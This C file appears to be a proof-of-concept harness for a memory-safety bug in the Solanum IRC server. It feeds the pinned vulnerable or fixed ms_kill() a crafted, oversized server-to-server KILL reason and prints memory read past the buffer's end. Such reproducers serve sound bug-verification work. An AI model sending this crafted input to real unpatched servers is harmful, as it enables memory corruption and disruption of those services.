/* Frontier harness: calls the verbatim pinned ms_kill() with a crafted
 * S2S KILL reason. MISHE_FIXED selects the 2ea1382 body; otherwise the
 * 7bc7e34 body is used. MISHE_PLAIN enables the non-ASan readback. */
#include "prelude.h"

#if defined(MISHE_FIXED)
#include "pinned_fixed.h"
#else
#include "pinned_vuln.h"
#endif

int main(int argc, char **argv)
{
	long n = (argc > 1) ? atol(argv[1]) : 510;
	static const char pattern[] = "MISHE-SOLANUM-OOB-";
	char *reason = malloc((size_t)n + 1);
	char *killcmd;
	const char *parv[3];
	size_t i;

	if (reason == NULL || n < 1) return 3;
	for (i = 0; i < (size_t)n; i++)
		reason[i] = pattern[i % (sizeof(pattern) - 1)];
	reason[n] = '\0';

	killcmd = malloc((size_t)n + 8);
	if (killcmd == NULL) return 3;
	snprintf(killcmd, (size_t)n + 8, "PATH %s", reason);

	memset(&mishe_victim, 0, sizeof(mishe_victim));
	memset(&mishe_source, 0, sizeof(mishe_source));
	memset(&mishe_server, 0, sizeof(mishe_server));
	strcpy(mishe_victim.name, "victim");
	strcpy(mishe_source.name, "serv.example");
	strcpy(mishe_source.username, "ircd");
	strcpy(mishe_source.host, "server.example");
	strcpy(mishe_source.orighost, "server.example");
	strcpy(mishe_server.name, "hub.example");
	mishe_source.servptr = &mishe_server;
	mishe_source.flags = 1u | 8u;	/* IsServer + IsOper */
	mishe_victim.flags = 4u;	/* MyConnect */

	parv[0] = "KILL";
	parv[1] = "victim";
	parv[2] = killcmd;
	ms_kill(NULL, &mishe_victim, &mishe_source, 3, parv);

#ifdef MISHE_PLAIN
	printf("reason_len=%ld buf_len=%zu\n", n, strlen(buf));
	printf("oob=%s\n", buf + BUFSIZE);
#else
	printf("clean reason_len=%ld\n", n);
#endif
	free(killcmd);
	free(reason);
	return 0;
}
